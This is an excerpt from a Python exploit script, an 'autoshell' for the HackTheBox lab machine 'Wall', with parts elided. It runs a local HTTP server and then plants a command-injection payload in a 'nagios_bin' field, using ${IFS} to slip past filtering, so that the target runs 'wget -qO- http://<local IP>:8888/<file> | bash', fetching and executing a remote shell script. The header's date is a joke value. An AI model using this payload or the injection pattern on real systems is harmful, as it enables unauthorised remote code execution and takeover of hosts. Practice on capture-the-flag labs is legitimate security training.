...
'''
# Exploit Title: HTB Wall 10.10.10.157 autoshell
# Date: 420/69/6969
# Exploit Author: boner
# $ python auto.py local_ip local_port
'''
...
if len(sys.argv) < 3:
    print(len(sys.argv))
    print("[~] Usage : ./auto.py local_ip local_port")
    exit()
...
serverProcess = subprocess.Popen('python2.7 -m SimpleHTTPServer 8888'.split(' '), stdout=subprocess.PIPE,shell=False, preexec_fn=os.setsid)
...
if "Your credentials are incorrect." not in login_request.text:
    ...
    payload_info = {
        ...
        #---------------------------------------------------------------------
        "nagios_bin": "wget${IFS}-qO-${IFS}http://"+localIP+":8888/"+fileName+"${IFS}|${IFS}bash;",
        #---------------------------------------------------------------------
